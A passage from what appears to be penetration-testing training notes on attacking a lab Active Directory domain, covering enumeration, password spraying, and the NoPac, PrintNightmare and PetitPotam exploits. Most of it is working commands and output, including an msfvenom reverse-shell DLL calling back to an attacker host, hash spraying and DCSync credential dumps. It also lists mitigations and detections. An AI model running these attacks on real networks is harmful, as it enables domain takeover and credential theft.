in-depth enumeration. Now let's perform some active checks.</p> <p>Start <code>fping</code> with a few flags: <code>a</code> to show targets that are alive, <code>s</code> to print stats at the end of the scan, <code>g</code> to generate a target list from the CIDR network, and <code>q</code> to not show per-target results.</p> <pre><code>secops@kali[/kali]$ fping -asgq 172.16.5.0/23\n\n172.16.5.5\n172.16.5.25\n172.16.5.50\n172.16.5.100\n172.16.5.125\n172.16.5.200\n172.16.5.225\n172.16.5.238\n172.16.5.240\n\n     510 targets\n       9 alive\n     501 unreachable\n       0 unknown addresses\n\n    2004 timeouts (waiting for response)\n    2013 ICMP Echos sent\n       9 ICMP Echo Replies received\n    2004 other ICMP received\n\n 0.029 ms (min round trip time)\n 0.396 ms (avg round trip time)\n 0.799 ms (max round trip time)\n       15.366 sec (elapsed real time)\n</code></pre> <p>Now that we have a list of active hosts within our network, we can enumerate those hosts further. We are looking to determine what services each host is running, identify critical hosts such as <code>Domain Controllers</code> and <code>web servers</code>, and identify potentially vulnerable hosts to probe later. With our focus on AD, after doing a broad sweep, it would be wise of us to focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos.</p> <pre><code>sudo nmap -v -A -iL hosts.txt -oN /home/user/Documents/host-enum\n</code></pre> <pre><code>Nmap scan report for legalcorp.local (172.16.5.5)\nHost is up (0.069s latency).\nNot shown: 987 closed tcp ports (conn-refused)\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-04 15:12:06Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: legalcorp.local0., Site: Default-First-Site-Name)\n|_ssl-date: 2022-04-04T15:12:53+00:00; -1s from scanner time.\n| ssl-cert: Subject:\n| Subject Alternative Name: DNS:ACADEMY-EA-DC01.legalcorp.local\n| Issuer: commonName=LEGALCORP-CA\n| Public Key type: rsa\n| Public Key bits: 2048\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2022-03-30T22:40:24\n| Not valid after:  2023-03-30T22:40:24\n| MD5:   3a09 d87a 9ccb 5498 2533 e339 ebe3 443f\n|_SHA-1: 9731 d8ec b219 4301 c231 793e f913 6868 d39f 7920\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: legalcorp.local0., Site: Default-First-Site-Name)\n&lt;SNIP&gt;  \n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: legalcorp.local0., Site: Default-First-Site-Name)\n3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: legalcorp.local0., Site: Default-First-Site-Name)\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info:\n|   Target_Name: LEGALCORP\n|   NetBIOS_Domain_Name: LEGALCORP\n|   NetBIOS_Computer_Name: ACADEMY-EA-DC01\n|   DNS_Domain_Name: legalcorp.local\n|   DNS_Computer_Name: ACADEMY-EA-DC01.legalcorp.local\n|   DNS_Tree_Name: legalcorp.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2022-04-04T15:12:45+00:00\n&lt;SNIP&gt;\n5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Service Unavailable\n|_http-server-header: Microsoft-HTTPAPI/2.0\nService Info: Host: ACADEMY-EA-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows\n</code></pre> <p>Our scans have provided us with the naming standard used by NetBIOS and DNS, we can see some hosts have RDP open, and they have pointed us in the direction of the primary <code>Domain Controller</code> for the legalcorp.local domain (ACADEMY-EA-DC01.legalcorp.local).</p>  Identifying Users <p>Kerbrute can be a stealthier option for domain account enumeration. It takes advantage of the fact that Kerberos pre-authentication failures often will not trigger logs or alerts. We will use Kerbrute in conjunction with the <code>jsmith.txt</code> or <code>jsmith2.txt</code> user lists from Insidetrust.</p> <pre><code>secops@kali[/kali]$ sudo git clone https://github.com/ropnop/kerbrute.git\n\nCloning into 'kerbrute'...\nremote: Enumerating objects: 845, done.\nremote: Counting objects: 100% (47/47), done.\nremote: Compressing objects: 100% (36/36), done.\nremote: Total 845 (delta 18), reused 28 (delta 10), pack-reused 798\nReceiving objects: 100% (845/845), 419.70 KiB | 2.72 MiB/s, done.\nResolving deltas: 100% (371/371), done.\n</code></pre> <pre><code>secops@kali[/kali]$ make help\n\nhelp:            Show this help.\nwindows:  Make Windows x86 and x64 Binaries\nlinux:  Make Linux x86 and x64 Binaries\nmac:  Make Darwin (Mac) x86 and x64 Binaries\nclean:  Delete any binaries\nall:  Make Windows, Linux and Mac x86/x64 Binaries\n</code></pre> <p>Compiling for Multiple Platforms and Architectures <pre><code>secops@kali[/kali]$ sudo make all\n\ngo: downloading github.com/spf13/cobra v1.1.1\ngo: downloading github.com/op/go-logging v0.0.0-20160315200505-970db520ece7\ngo: downloading github.com/ropnop/gokrb5/v8 v8.0.0-20201111231119-729746023c02\ngo: downloading github.com/spf13/pflag v1.0.5\ngo: downloading github.com/jcmturner/gofork v1.0.0\ngo: downloading github.com/hashicorp/go-uuid v1.0.2\ngo: downloading golang.org/x/crypto v0.0.0-20201016220609-9e8e0b390897\ngo: downloading github.com/jcmturner/rpc/v2 v2.0.2\ngo: downloading github.com/jcmturner/dnsutils/v2 v2.0.0\ngo: downloading github.com/jcmturner/aescts/v2 v2.0.0\ngo: downloading golang.org/x/net v0.0.0-20200114155413-6afb5195e5aa\ncd /tmp/kerbrute\nrm -f kerbrute kerbrute.exe kerbrute kerbrute.exe kerbrute.test kerbrute.test.exe kerbrute.test kerbrute.test.exe main main.exe\nrm -f /root/go/bin/kerbrute\nDone.\nBuilding for windows amd64..\n\n&lt;SNIP&gt;\n</code></pre></p> <pre><code>secops@kali[/kali]$ ls dist/\n\nkerbrute_darwin_amd64  kerbrute_linux_386  kerbrute_linux_amd64  kerbrute_windows_386.exe  kerbrute_windows_amd64.exe\n</code></pre> <p>Enumerating Users with Kerbrute <pre><code>secops@kali[/kali]$ kerbrute userenum -d legalcorp.local --dc 172.16.5.5 jsmith.txt -o valid_ad_users\n\n2021/11/17 23:01:46 &gt;  Using KDC(s):\n2021/11/17 23:01:46 &gt;   172.16.5.5:88\n2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       jjones@legalcorp.local\n2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       sbrown@legalcorp.local\n2021/11/17 23:01:46 &gt;  [+] VALID USERNAME:       tjohnson@legalcorp.local\n2021/11/17 23:01:50 &gt;  [+] VALID USERNAME:       evalentin@legalcorp.local\n\n &lt;SNIP&gt;\n\n2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       sgage@legalcorp.local\n2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jshay@legalcorp.local\n2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       jhermann@legalcorp.local\n2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       whouse@legalcorp.local\n2021/11/17 23:01:51 &gt;  [+] VALID USERNAME:       emercer@legalcorp.local\n2021/11/17 23:01:52 &gt;  [+] VALID USERNAME:       wshepherd@legalcorp.local\n2021/11/17 23:01:56 &gt;  Done! Tested 48705 usernames (56 valid) in 9.940 seconds\n</code></pre></p> <p>Now we can take these results and build a list for use in targeted password spraying attacks.</p>","title":"Initial Enumeration of the Domain"},{"location":"active_directory/spray_responsibility/internal_pwd_spray_from_linux/","text":"<p>Rpcclient with this Bash one-liner (adapted from here) can be used to perform the attack.</p> <pre><code>for u in $(cat valid_users.txt);do rpcclient -U \"$u%Welcome1\" -c \"getusername;quit\" 172.16.5.5 | grep Authority; done\n</code></pre> <p>We can also use <code>Kerbrute</code> for the same attack.</p> <pre><code>secops@kali[/kali]$ kerbrute passwordspray -d legalcorp.local --dc 172.16.5.5 valid_users.txt  Welcome1\n\n    __             __               __     \n   / /_____  _____/ /_  _______  __/ /____ \n  / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\\n / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/\n/_/|_|\\___/_/  /_.___/_/   \\__,_/\\__/\\___/                                        \n\nVersion: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop\n\n2022/02/17 22:57:12 &gt;  Using KDC(s):\n2022/02/17 22:57:12 &gt;   172.16.5.5:88\n\n2022/02/17 22:57:12 &gt;  [+] VALID LOGIN:  sgage@legalcorp.local:Welcome1\n2022/02/17 22:57:12 &gt;  Done! Tested 57 logins (1 successes) in 0.172 seconds\n</code></pre> <p>There are multiple other methods for performing password spraying from Linux.</p> <p>Using CrackMapExec &amp; Filtering Logon Failures</p> <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\avazquez:Password123 \n</code></pre> <p><code>CrackMapExec</code> to validate the credentials quickly against a Domain Controller.</p> <pre><code>secops@kali[/kali]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123\n\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:legalcorp.local) (signing:True) (SMBv1:False)\nSMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] legalcorp.local\\avazquez:Password123\n</code></pre>  Local Administrator Password Reuse <p>Sometimes we may only retrieve the NTLM hash for the local administrator account from the local SAM database. In these instances, we can spray the NT hash across an entire subnet. The <code>--local-auth</code> flag will tell the tool only to attempt to log in one time on each machine which removes any risk of account lockout.</p> <pre><code>secops@kali[/kali]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +\n\nSMB         172.16.5.50     445    ACADEMY-EA-MX01  [+] ACADEMY-EA-MX01\\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)\nSMB         172.16.5.25     445    ACADEMY-EA-MS01  [+] ACADEMY-EA-MS01\\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)\nSMB         172.16.5.125    445    ACADEMY-EA-WEB0  [+] ACADEMY-EA-WEB0\\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)\n</code></pre> <p>We could then move to enumerate each system to see if we can find anything that will help further our access.</p>  <p><p>This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth. It is always worth looking for this issue during penetration tests, even if it is not part of our path to compromise the domain, as it is a common issue and should be highlighted for our clients. One way to remediate this issue is using the free Microsoft tool Local Administrator Password Solution (LAPS).</p></p>","title":"Internal Spraying - Linux"},{"location":"active_directory/spray_responsibility/internal_pwd_spray_from_windows/","text":"<p>If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.</p> <p>Since the host is domain-joined, we will skip the <code>-UserList</code> flag and let the tool generate a list for us.</p> <pre><code>PS C:\\xyz&gt; Import-Module .\\DomainPasswordSpray.ps1\nPS C:\\xyz&gt; Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue\n\n[*] Current domain is compatible with Fine-Grained Password Policy.\n[*] Now creating a list of users to spray...\n[*] The smallest lockout threshold discovered in the domain is 5 login attempts.\n[*] Removing disabled users from list.\n[*] There are 2923 total users found.\n[*] Removing users within 1 attempt of locking out from list.\n[*] Created a userlist containing 2923 users gathered from the current user's domain\n[*] The domain password policy observation window is set to  minutes.\n[*] Setting a  minute wait in between sprays.\n\nConfirm Password Spray\nAre you sure you want to perform a password spray against 2923 accounts?\n[Y] Yes  [N] No  [?] Help (default is \"Y\"): Y\n\n[*] Password spraying has begun with  1  passwords\n[*] This might take a while depending on the total number of users\n[*] Now trying password Welcome1 against 2923 users. Current time is 2:57 PM\n[*] Writing successes to spray_success\n[*] SUCCESS! User:sgage Password:Welcome1\n[*] SUCCESS! User:tjohnson Password:Welcome1\n\n[*] Password spraying is complete\n[*] Any passwords that were successfully sprayed have been output to spray_success\n</code></pre> <p>We could also utilize Kerbrute to perform the same user enumeration and spraying steps.</p>  Mitigations <p>Several steps can be taken to mitigate the risk of password spraying attacks. While no single solution will entirely prevent the attack, a defense-in-depth approach will render password spraying attacks extremely difficult.</p>    Technique Description     <code>Multi-factor Authentication</code> Multi-factor authentication can greatly reduce the risk of password spraying attacks. Many types of multi-factor authentication exist, such as push notifications to a mobile device, a rotating One Time Password (OTP) such as Google Authenticator, RSA key, or text message confirmations. While this may prevent an attacker from gaining access to an account, certain multi-factor implementations still disclose if the username/password combination is valid. It may be possible to reuse this credential against other exposed services or applications. It is important to implement multi-factor solutions with all external portals.   <code>Restricting Access</code> It is often possible to log into applications with any domain user account, even if the user does not need to access it as part of their role. In line with the principle of least privilege, access to the application should be restricted to those who require it.   <code>Reducing Impact of Successful Exploitation</code> A quick win is to ensure that privileged users have a separate account for any administrative activities. Application-specific permission levels should also be implemented if possible. Network segmentation is also recommended because if an attacker is isolated to a compromised subnet, this may slow down or entirely stop lateral movement and further compromise.   <code>Password Hygiene</code> Educating users on selecting difficult to guess passwords such as passphrases can significantly reduce the efficacy of a password spraying attack. Also, using a password filter to restrict common dictionary words, names of months and seasons, and variations on the company's name will make it quite difficult for an attacker to choose a valid password for spraying attempts.     Other Considerations <p>It is vital to ensure that your domain password lockout policy doesn\u2019t increase the risk of denial of service attacks. If it is very restrictive and requires an administrative intervention to unlock accounts manually, a careless password spray may lock out many accounts within a short period.</p>  Detection <p>Some indicators of external password spraying attacks include many account lockouts in a short period, server or application logs showing many login attempts with valid or non-existent users, or many requests in a short period to a specific application or URL.</p> <p>In the Domain Controller\u2019s security log, many instances of event ID 4625: An account failed to log on over a short period may indicate a password spraying attack. Organizations should have rules to correlate many logon failures within a set time interval to trigger an alert. A more savvy attacker may avoid SMB password spraying and instead target LDAP. Organizations should also monitor event ID 4771: Kerberos pre-authentication failed, which may indicate an LDAP password spraying attempt. To do so, they will need to enable Kerberos logging. This post details research around detecting password spraying using Windows Security Event Logging.</p> <p>With these mitigations finely tuned and with logging enabled, an organization will be well-positioned to detect and defend against internal and external password spraying attacks.</p>","title":"Internal Spraying - Windows"},{"location":"active_directory/stacking_the_deck/bleeding_edge_vulns/","text":"NoPac (SamAccountName Spoofing) <p>This encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.</p> <p>We can use this tool to perform this attack.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/Ridter/noPac.git\n</code></pre> <p>We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is vulnerable. </p> <pre><code>secops@kali[/kali]$ sudo python3 scanner.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap\n\n\u2588\u2588\u2588    \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588 \n\u2588\u2588\u2588\u2588   \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588 \u2588\u2588  \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588      \n\u2588\u2588  \u2588\u2588 \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588   \u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588      \u2588\u2588   \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588 \n\n[*] Current ms-DS-MachineAccountQuota = 10\n[*] Got TGT with PAC from 172.16.5.5. Ticket size 1484\n[*] Got TGT from ACADEMY-EA-DC01.legalcorp.local. Ticket size 663\n</code></pre> <p>There are many different ways to use NoPac to further our access. One way is to obtain a shell with SYSTEM level privileges. This could be \"noisy\" or may be blocked by AV or EDR.</p> <pre><code>secops@kali[/kali]$ sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap\n\n\u2588\u2588\u2588    \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588 \n\u2588\u2588\u2588\u2588   \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588 \u2588\u2588  \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588      \n\u2588\u2588  \u2588\u2588 \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588   \u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588      \u2588\u2588   \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588 \n\n[*] Current ms-DS-MachineAccountQuota = 10\n[*] Selected Target ACADEMY-EA-DC01.legalcorp.local\n[*] will try to impersonat administrator\n[*] Adding Computer Account \"WIN-LWJFQMAXRVN$\"\n[*] MachineAccount \"WIN-LWJFQMAXRVN$\" password = &amp;A#x8X^5iLva\n[*] Successfully added machine account WIN-LWJFQMAXRVN$ with password &amp;A#x8X^5iLva.\n[*] WIN-LWJFQMAXRVN$ object = CN=WIN-LWJFQMAXRVN,CN=Computers,DC=LEGALCORP,DC=LOCAL\n[*] WIN-LWJFQMAXRVN$ sAMAccountName == ACADEMY-EA-DC01\n[*] Saving ticket in ACADEMY-EA-DC01.ccache\n[*] Resting the machine account to WIN-LWJFQMAXRVN$\n[*] Restored WIN-LWJFQMAXRVN$ sAMAccountName to original value\n[*] Using TGT from cache\n[*] Impersonating administrator\n[*]     Requesting S4U2self\n[*] Saving ticket in administrator.ccache\n[*] Remove ccache of ACADEMY-EA-DC01.legalcorp.local\n[*] Rename ccache with target ...\n[*] Attempting to del a computer with the name: WIN-LWJFQMAXRVN$\n[-] Delete computer WIN-LWJFQMAXRVN$ Failed! Maybe the current user does not have permission.\n[*] Pls make sure your choice hostname and the -dc-ip are same machine !!\n[*] Exploiting..\n[!] Launching semi-interactive shell - Careful what you execute\nC:\\Windows\\system32&gt;\n</code></pre> <p>With smbexec shells we will need to use exact paths instead of navigating the directory structure using <code>cd</code>.</p> <p>Confirming location of saved tickets <pre><code>secops@kali[/kali]$ ls\n\nadministrator_DC01.legalcorp.local.ccache  noPac.py   requirements.txt  utils\nREADME.md  scanner.py\n</code></pre></p> <p>We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the <code>-dump</code> flag to perform a DCSync using secretsdump.py.</p> <pre><code>secops@kali[/kali]$ sudo python3 noPac.py legalcorp.local/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user LEGALCORP/administrator\n\n\u2588\u2588\u2588    \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588   \u2588\u2588\u2588\u2588\u2588\u2588 \n\u2588\u2588\u2588\u2588   \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588 \u2588\u2588  \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588\u2588 \u2588\u2588      \n\u2588\u2588  \u2588\u2588 \u2588\u2588 \u2588\u2588    \u2588\u2588 \u2588\u2588      \u2588\u2588   \u2588\u2588 \u2588\u2588      \n\u2588\u2588   \u2588\u2588\u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588      \u2588\u2588   \u2588\u2588  \u2588\u2588\u2588\u2588\u2588\u2588 \n\n[*] Current ms-DS-MachineAccountQuota = 10\n[*] Selected Target ACADEMY-EA-DC01.legalcorp.local\n[*] will try to impersonat administrator\n[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.legalcorp.local\n[*] Pls make sure your choice hostname and the -dc-ip are same machine !!\n[*] Exploiting..\n[*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash)\n[*] Using the DRSUAPI method to get NTDS.DIT secrets\nlegalcorp.local\\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::\n[*] Kerberos keys grabbed\nlegalcorp.local\\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6\nlegalcorp.local\\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25\nlegalcorp.local\\administrator:des-cbc-md5:70add6e02f70321f\n[*] Cleaning up...\n</code></pre>  Windows Defender &amp; SMBEXEC.py Considerations <p>If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. The first thing smbexec.py does is create a service called <code>BTOBTO</code>. Another service called <code>BTOBO</code> is created, and any command we type is sent to the target over SMB inside a .bat file called <code>execute.bat</code>. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system.</p>  PrintNightmare <p>In this case, we will be using cube0x0's exploit.</p> <pre><code>secops@kali[/kali]$ git clone https://github.com/cube0x0/CVE-2021-1675.git\n</code></pre> <p>For this exploit to work successfully, we will need to use cube0x0's version of Impacket.  <pre><code>pip3 uninstall impacket\ngit clone https://github.com/cube0x0/impacket\ncd impacket\npython3 ./setup.py install\n</code></pre></p> <p>We can use <code>rpcdump.py</code> to see if <code>Print System Asynchronous Protocol</code> and <code>Print System Remote Protocol</code> are exposed on the target.</p> <pre><code>secops@kali[/kali]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'\n\nProtocol: [MS-PAR]: Print System Asynchronous Remote Protocol \nProtocol: [MS-RPRN]: Print System Remote Protocol \n</code></pre> <p>After confirming this, we can proceed.</p> <pre><code>secops@kali[/kali]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll &gt; backupscript.dll\n\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder specified, outputting raw payload\nPayload size: 510 bytes\nFinal size of dll file: 8704 bytes\n</code></pre> <p>Host this payload in an SMB share we create on our attack host using <code>smbserver.py</code>.</p> <pre><code>secops@kali[/kali]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll\n\nImpacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation\n\n[*] Config file parsed\n[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0\n[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0\n[*] Config file parsed\n[*] Config file parsed\n[*] Config file parsed\n</code></pre> <p>Once the share is created and hosting our payload, we can use MSF to configure &amp; start a multi handler responsible for catching the reverse shell.</p> <pre><code>[msf](Jobs:0 Agents:0) &gt;&gt; use exploit/multi/handler\n[*] Using configured payload generic/shell_reverse_tcp\n[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp\nPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcp\n[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LHOST 10.129.202.111\nLHOST =&gt; 10.3.88.114\n[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; set LPORT 8080\nLPORT =&gt; 8080\n[msf](Jobs:0 Agents:0) exploit(multi/handler) &gt;&gt; run\n\n[*] Started reverse TCP handler on 10.129.202.111:8080 \n</code></pre> <p>With the share hosting our payload and our multi handler listening for a connection, we can attempt to run the exploit against the target.</p> <pre><code>secops@kali[/kali]$ sudo python3 CVE-2021-1675.py legalcorp.local/&lt;username&gt;:&lt;password&gt;@172.16.5.5 '\\\\10.129.202.111\\CompData\\backupscript.dll'\n\n[*] Connecting to ncacn_np:172.16.5.5[\\PIPE\\spoolss]\n[+] Bind OK\n[+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_83aa9aebf5dffc96\\Amd64\\UNIDRV.DLL\n[*] Executing \\??\\UNC\\10.129.202.111\\CompData\\backupscript.dll\n[*] Try 1...\n[*] Stage0: 0\n[*] Try 2...\n[*] Stage0: 0\n[*] Try 3...\n\n&lt;SNIP&gt;\n</code></pre> <p>If all goes well after running the exploit, the target will access the share and execute the payload. The payload will then call back.</p> <pre><code>[*] Sending stage (200262 bytes) to 172.16.5.5\n[*] Meterpreter session 1 opened (10.129.202.111:8080 -&gt; 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400\n\n(Meterpreter 1)(C:\\Windows\\system32) &gt; shell\nProcess 5912 created.\nChannel 1 created.\nMicrosoft Windows [Version 10.0.17763.737]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt;whoami\nwhoami\nnt authority\\system\n</code></pre> <p>We have NT AUTHORITY\\SYSTEM privileges on the target Domain Controller starting from just a standard domain user account.</p>  PetitPotam (MS-EFSRPC) <p>PetitPotam (CVE-2021-36942) is an LSA spoofing vulnerability that was patched in August of 2021.</p> <p>This blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.</p> <p>First off, we need to start <code>ntlmrelayx.py</code> in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. If we didn't know the location of the CA, we could use a tool such as certi to attempt to locate it.</p> <pre><code>secops@kali[/kali]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.legalcorp.local/certsrv/certfnsh.asp --adcs --template DomainController\n\nImpacket v0.9.24.dev1+20211013.152215.3fe2d73a - \n\nCopyright 2021 SecureAuth Corporation\n\n[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket\n[*] Protocol Client DCSYNC loaded..\n[*] Protocol Client HTTP loaded..\n[*] Protocol Client HTTPS loaded..\n[*] Protocol Client IMAPS loaded..\n[*] Protocol Client IMAP loaded..\n[*] Protocol Client LDAP loaded..\n[*] Protocol Client LDAPS loaded..\n[*] Protocol Client MSSQL loaded..\n[*] Protocol Client RPC loaded..\n[*] Protocol Client SMB loaded..\n[*] Protocol Client SMTP loaded..\n[+] Protocol Attack DCSYNC loaded..\n[+] Protocol Attack HTTP loaded..\n[+] Protocol Attack HTTPS loaded..\n[+] Protocol Attack IMAP loaded..\n[+] Protocol Attack IMAPS loaded..\n[+] Protocol Attack LDAP loaded..\n[+] Protocol Attack LDAPS loaded..\n[+] Protocol Attack MSSQL loaded..\n[+] Protocol Attack RPC loaded..\n[+] Protocol Attack SMB loaded..\n[*] Running in relay mode to single host\n[*] Setting up SMB Server\n[*] Setting up HTTP Server\n[*] Setting up WCF Server\n\n[*] Servers started, waiting for connections\n</code></pre> <p>In another window, we can run the tool PetitPotam.py. We run this tool with the command <code>python3 PetitPotam.py &lt;attack host IP&gt; &lt;Domain Controller IP&gt;</code> to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.</p> <p>There is an executable version of this tool that can be run from a Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS) module: <code>misc::efs /server:&lt;Domain Controller&gt; /connect:&lt;ATTACK HOST&gt;</code>. There is also a PowerShell implementation of the tool Invoke-PetitPotam.ps1.</p> <p>Here we run the tool and attempt to coerce authentication via the EfsRpcOpenFileRaw method.</p> <pre><code>secops@kali[/kali]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       \n\n              ___            _        _      _        ___            _                     \n             | _ \\   ___    | |_     (_)    | |_     | _ \\   ___    | |_    __ _    _ __   \n             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \\   |  _|  / _` |  | '  \\  \n            _|_|_   \\___|   _\\__|   _|_|_   _\\__|   _|_|_   \\___/   _\\__|  \\__,_|  |_|_|_| \n          _| \"\"\" |_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_| \"\"\" |_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"|_|\"\"\"\"\"| \n          \"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-'\"`-0-0-' \n\n              PoC to elicit machine account authentication via some MS-EFSRPC functions\n                                      by topotam (@topotam77)\n\n                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN\n\nTrying pipe lsarpc\n[-] Connecting to ncacn_np:172.16.5.5[\\PIPE\\lsarpc]\n[+] Connected!\n[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e\n[+] Successfully bound!\n[-] Sending 